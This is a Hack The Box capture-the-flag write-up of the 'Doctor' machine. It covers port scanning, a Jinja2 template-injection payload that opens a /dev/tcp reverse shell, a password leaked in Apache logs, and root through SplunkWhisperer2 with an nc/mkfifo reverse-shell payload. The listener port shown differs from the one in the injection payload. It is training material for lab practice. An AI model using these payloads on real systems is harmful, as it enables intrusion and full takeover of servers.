# Doctor — From SSTI to Splunk Root

> **Hack The Box — Doctor**
> **Difficulty:** Medium
> **Target:** `10.129.2.21`
> **Domain:** `doctors.htb`

---

## 01 — Overview

Doctor is a medium-difficulty Linux machine on Hack The Box.

The initial enumeration revealed three interesting services: **SSH**, **HTTP**, and a Splunk management service on port `8089`.

The web application hosted at `doctors.htb` provided registration and login functionality. After creating an account, further enumeration revealed an archive feature that returned content in **RSS/XML format**.

Testing the application's post functionality uncovered a **Server-Side Template Injection (SSTI)** vulnerability. This was leveraged to execute commands and obtain a reverse shell as the `web` user.

Further enumeration revealed an Apache log containing a password value. This credential was used to obtain access as the `shaun` user.

Finally, the exposed Splunk management service on port `8089` was identified as a privilege-escalation path. **SplunkWhisperer2** was used with the discovered credentials to execute a payload through the Splunk Universal Forwarder and obtain a root shell.

---

# 02 — Recon: Mapping the Attack Surface

## Full Port Scan

The initial scan covered all TCP ports:

```bash
nmap 10.129.2.21 -p-
```

The scan revealed:

| Port | State | Service          |
| ---: | ----- | ---------------- |
|   22 | Open  | SSH              |
|   80 | Open  | HTTP             |
| 8089 | Open  | Unknown / Splunk |

---

## Service and Version Detection

A service/version scan was then performed against the discovered ports.

```text
22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.1
80/tcp   open  http     Apache httpd 2.4.41 (Ubuntu)
8089/tcp open  ssl/http Splunkd httpd
```

The service on port `8089` identified itself as **Splunkd**.

The HTTP service identified the web application as:

```text
Doctor
```

---

# 03 — Web Enumeration: Finding `doctors.htb`

The web application revealed names and the hostname:

```text
doctors.htb
```

The hostname was added to `/etc/hosts` for easier access.

Navigating to the domain revealed a registration and login page.

An account was created using:

```text
Username: doctor1
Password: 123456789
```

This provided authenticated access to the application.

---

# 04 — Directory Enumeration: Mapping the Application

Directory enumeration revealed several interesting endpoints:

```text
/login
/
/home
/archive
/account
/register
/logout
/reset_password
/static/main.css
/server-status
```

The `/archive` endpoint was particularly interesting because its response contained RSS/XML content.

The response began with:

```xml
<?xml version="1.0" encoding="UTF-8" ?>
<rss version="2.0">
<channel>
<title>Archive</title>
```

This suggested that user-generated content was being processed and rendered into an XML/RSS response.

---

# 05 — SSTI: Turning User Input Into Code Execution

With an authenticated session available, testing focused on the application's post functionality.

Several SSTI payloads were tested.

The application reflected the submitted content into the archive output, providing evidence that the server was processing template syntax.

A Python/Jinja-style SSTI payload was then used to execute a reverse shell:

```jinja2
{% for x in ().__class__.__base__.__subclasses__() %}
{% if "warning" in x.__name__ %}
{{x()._module.__builtins__['__import__']('os').popen("bash -c
'bash -i >& /dev/tcp/10.10.14.2/1234 0>&1'").read()}}
{%endif%}
{%endfor%}
```

This resulted in a reverse shell connection to the attacking machine.

---

# 06 — Initial Foothold: Shell as `web`

A Netcat listener was started:

```bash
nc -lvnp 4444
```

The target connected back successfully:

```text
Connection received on 10.129.2.21 38338
```

The initial shell was:

```text
web@doctor:~$
```

The shell was then stabilized using Python:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

After configuring the local terminal:

```bash
stty raw -echo
fg
```

and setting the terminal environment:

```bash
export TERM=xterm-256color
```

the shell became fully interactive.

---

# 07 — Credential Discovery: Apache Logs

With shell access established, local enumeration continued.

An Apache log backup contained an interesting entry:

```text
/var/log/apache2/backup
```

The relevant log entry was:

```text
10.10.14.4 - - [05/Sep/2020:11:17:34 +2000] "POST /reset_password?email=Guitar123" 500 453 "http://doctor.htb/reset_password"
```

The value exposed through the password-reset request was:

```text
Guitar123
```

This became an important credential for the next stage.

---

# 08 — User Access: `shaun`

The notes show access to the `shaun` user's home directory:

```text
shaun@doctor:~$ ls
user.txt
```

The user flag was present in the home directory:

```bash
cat user.txt
```

The recovered credential was also later used against the Splunk service for privilege escalation.

---

# 09 — Privilege Escalation: The Splunk Service

Returning to the original enumeration, port `8089` stood out as a Splunk management service.

The service was identified during the initial Nmap scan as:

```text
8089/tcp open ssl/http Splunkd httpd
```

The notes identify this as a **Splunk Universal Forwarder** management service.

The management service on port `8089` allows remote connections and can be used to send commands or scripts to Universal Forwarder agents.

The notes further identify **SplunkWhisperer2** as the exploitation method.

---

# 10 — SplunkWhisperer2: Turning Management Access Into Root

The SplunkWhisperer2 repository was cloned:

```bash
git clone https://github.com/cnotin/SplunkWhisperer2
cd SplunkWhisperer2/PySplunkWhispherer2/
```

The remote exploitation script was then executed using the `shaun` credentials:

```bash
python3 PySplunkWhisperer2_remote.py \
  --host 10.129.2.21 \
  --username shaun \
  --password Guitar123 \
  --lhost 10.10.15.95 \
  --payload 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.95 4445 >/tmp/f'
```

The payload created a reverse shell back to the attacking machine.

---

# 11 — Root Access: `uid=0`

A second Netcat listener was started:

```bash
nc -lvnp 4445
```

The target connected back:

```text
Connection received on 10.129.2.21 47798
/bin/sh: 0: can't access tty; job control turned off
```

Running:

```bash
id
```

confirmed full root privileges:

```text
uid=0(root) gid=0(root) groups=0(root)
```

The root flag was then read with:

```bash
cat /root/root.txt
```

---

# 12 — Attack Path Summary

```text
                    ┌─────────────────────┐
                    │ 10.129.2.21         │
                    └──────────┬──────────┘
                               │
                    Network Enumeration
                               │
             ┌─────────────────┼─────────────────┐
             │                 │                 │
            SSH               HTTP           Splunk :8089
             │                 │                 │
             │          doctors.htb              │
             │                 │                 │
             │        Register / Login           │
             │                 │                 │
             │          /archive + posts         │
             │                 │                 │
             │               SSTI                │
             │                 │                 │
             │          Reverse Shell            │
             │                 │                 │
             │               web                  │
             │                 │                 │
             │          Apache log               │
             │                 │                 │
             │          Guitar123                │
             │                 │                 │
             │              shaun                │
             │                 │                 │
             └─────────────────┼─────────────────┘
                               │
                     SplunkWhisperer2
                               │
                               ▼
                         Reverse Shell
                               │
                               ▼
                          uid=0(root)
```

---

# 13 — Key Takeaways

### Web Application Enumeration

The `doctors.htb` application demonstrated why authenticated functionality should be tested after registration.

Interesting functionality included:

* User registration
* Login
* Posts
* Archive/RSS output
* Password reset

### SSTI

The archive functionality processed user-controlled content in a server-side template context.

This ultimately allowed template injection to be leveraged for command execution and an initial reverse shell.

### Sensitive Log Files

Apache log backups can contain sensitive information.

In this case, a password value was exposed through a logged password-reset request.

### Service Enumeration Matters

The Splunk management service on port `8089` was identified during the initial scan.

Without revisiting the initial enumeration after obtaining user access, this privilege-escalation opportunity could easily be overlooked.

### Splunk Universal Forwarder Security

The machine demonstrates the security implications of an exposed Splunk management interface and the importance of properly securing management services.

---

# 14 — Tools Used

| Tool             | Purpose                      |
| ---------------- | ---------------------------- |
| Nmap             | Port and service enumeration |
| Gobuster         | Directory enumeration        |
| cURL             | Web interaction              |
| Netcat           | Reverse shell listener       |
| Python3          | Shell stabilization          |
| Git              | Obtaining SplunkWhisperer2   |
| SplunkWhisperer2 | Splunk privilege escalation  |

---

# 15 — Conclusion

Doctor was a great example of a multi-stage Linux compromise.

The attack began with basic network enumeration, which exposed the web application and a Splunk management service.

Web enumeration led to `doctors.htb`, where registration provided access to additional functionality. Testing the application's post/archive workflow uncovered an **SSTI vulnerability**, which was used to obtain a shell as `web`.

Further enumeration of the system revealed sensitive Apache log data containing a useful credential, allowing progression to the `shaun` account.

Finally, the previously discovered Splunk service on port `8089` became the key to privilege escalation. Using **SplunkWhisperer2** with the recovered credentials resulted in command execution with root privileges.

The complete chain was:

**Web Enumeration → SSTI → Reverse Shell → Log Credential Discovery → User Access → Splunk Enumeration → SplunkWhisperer2 → Root**
